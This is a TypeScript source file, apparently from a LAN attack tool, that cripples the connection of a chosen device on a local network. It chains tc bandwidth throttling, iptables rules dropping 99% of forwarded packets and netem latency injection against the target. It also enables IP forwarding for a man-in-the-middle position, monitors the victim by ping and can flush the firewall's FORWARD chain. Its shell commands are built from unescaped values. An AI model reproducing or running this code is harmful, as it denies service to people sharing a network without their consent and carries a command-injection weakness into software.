import { exec } from './exec';
import type { AttackConfig, AttackRules } from '../types';

/**
 * Apply extreme bandwidth limitation (TRIPLE KILL)
 * 
 * Attack Vector:
 * 1. TC (Traffic Control) - Bandwidth throttle to 1KB/s
 * 2. iptables - 99% packet drop
 * 3. TC netem - 5000ms latency
 */
export async function killTarget(config: AttackConfig): Promise<AttackRules> {
  const { targetIp, interface: iface } = config;
  const rules: AttackRules = {
    tc: [],
    iptables: [],
    netem: [],
  };

  try {
    // === PHASE 1: Bandwidth Throttle (1KB/s) ===
    console.log('  Applying bandwidth throttle (1KB/s)...');
    
    // Create root qdisc with HTB
    await exec(`tc qdisc add dev ${iface} root handle 1: htb default 999`);
    rules.tc.push(`tc qdisc del dev ${iface} root`);

    // Create class with 1kbit rate (basically dead)
    await exec(`tc class add dev ${iface} parent 1: classid 1:1 htb rate 1kbit ceil 1kbit`);
    
    // Filter to target specific IP
    await exec(
      `tc filter add dev ${iface} protocol ip parent 1:0 prio 1 u32 match ip dst ${targetIp} flowid 1:1`
    );

    // === PHASE 2: Packet Drop (99%) ===
    console.log('  Applying packet drop (99%)...');
    
    // Drop incoming packets to target
    await exec(
      `iptables -I FORWARD -d ${targetIp} -m statistic --mode random --probability 0.99 -j DROP`
    );
    rules.iptables.push(`iptables -D FORWARD -d ${targetIp} -m statistic --mode random --probability 0.99 -j DROP`);

    // Drop outgoing packets from target
    await exec(
      `iptables -I FORWARD -s ${targetIp} -m statistic --mode random --probability 0.99 -j DROP`
    );
    rules.iptables.push(`iptables -D FORWARD -s ${targetIp} -m statistic --mode random --probability 0.99 -j DROP`);

    // === PHASE 3: Latency Injection (5000ms) ===
    console.log('  Applying latency injection (5000ms)...');
    
    // Add massive delay with variation
    await exec(
      `tc qdisc add dev ${iface} parent 1:1 handle 10: netem delay 5000ms 2000ms loss 10%`
    );
    rules.netem.push(`tc qdisc del dev ${iface} parent 1:1 handle 10:`);

    return rules;

  } catch (error) {
    // Rollback on error
    await cleanupRules(rules);
    throw new Error(`Failed to apply attack: ${error}`);
  }
}

/**
 * Stop all attacks and cleanup rules
 */
export async function stopAttack(iface: string, rules?: AttackRules): Promise<void> {
  try {
    if (rules) {
      // Remove specific rules
      await cleanupRules(rules);
    } else {
      // Nuclear cleanup - remove everything
      await exec(`tc qdisc del dev ${iface} root 2>/dev/null`, { ignoreError: true });
      await exec(`iptables -F FORWARD 2>/dev/null`, { ignoreError: true });
    }
  } catch (error) {
    throw new Error(`Cleanup failed: ${error}`);
  }
}

/**
 * Cleanup specific rules
 */
async function cleanupRules(rules: AttackRules): Promise<void> {
  // Remove TC rules
  for (const cmd of rules.tc) {
    await exec(cmd, { ignoreError: true });
  }

  // Remove iptables rules
  for (const cmd of rules.iptables) {
    await exec(cmd, { ignoreError: true });
  }

  // Remove netem rules
  for (const cmd of rules.netem) {
    await exec(cmd, { ignoreError: true });
  }
}

/**
 * Check if IP forwarding is enabled (required for attack)
 */
export async function checkIpForwarding(): Promise<boolean> {
  try {
    const { stdout } = await exec('sysctl net.ipv4.ip_forward');
    return stdout.includes('= 1');
  } catch {
    return false;
  }
}

/**
 * Enable IP forwarding (required for MITM)
 */
export async function enableIpForwarding(): Promise<void> {
  try {
    await exec('sysctl -w net.ipv4.ip_forward=1');
  } catch (error) {
    throw new Error('Failed to enable IP forwarding');
  }
}

/**
 * Validate target IP is safe to attack
 */
export function validateTarget(targetIp: string, networkInfo: { gateway: string; ip: string }): void {
  // Check if private IP
  if (!isPrivateIP(targetIp)) {
    throw new Error('Target must be a private IP address (10.x, 172.16-31.x, 192.168.x)');
  }

  // Cannot target gateway
  if (targetIp === networkInfo.gateway) {
    throw new Error('Cannot target gateway - would kill your own connection');
  }

  // Cannot target own IP
  if (targetIp === networkInfo.ip) {
    throw new Error('Cannot target own IP address');
  }
}

/**
 * Check if IP is private range
 */
function isPrivateIP(ip: string): boolean {
  const parts = ip.split('.').map(Number);
  const [first = 0, second = 0] = parts;

  if (parts.length !== 4) return false;

  // 10.0.0.0/8
  if (first === 10) return true;

  // 172.16.0.0/12
  if (first === 172 && second >= 16 && second <= 31) return true;

  // 192.168.0.0/16
  if (first === 192 && second === 168) return true;

  // 127.0.0.0/8 (localhost)
  if (first === 127) return true;

  return false;
}

/**
 * Monitor target connectivity
 */
export async function monitorTarget(ip: string): Promise<{ alive: boolean; latency?: number }> {
  try {
    const start = Date.now();
    const { stdout, success } = await exec(`ping -c 1 -W 2 ${ip}`, { ignoreError: true });
    const latency = Date.now() - start;

    if (!success) {
      return { alive: false };
    }

    // Parse ping time
    const match = stdout.match(/time=([\d.]+)/);
    const pingTime = match ? parseFloat(match[1] || '0') : latency;

    return {
      alive: true,
      latency: pingTime,
    };
  } catch {
    return { alive: false };
  }
}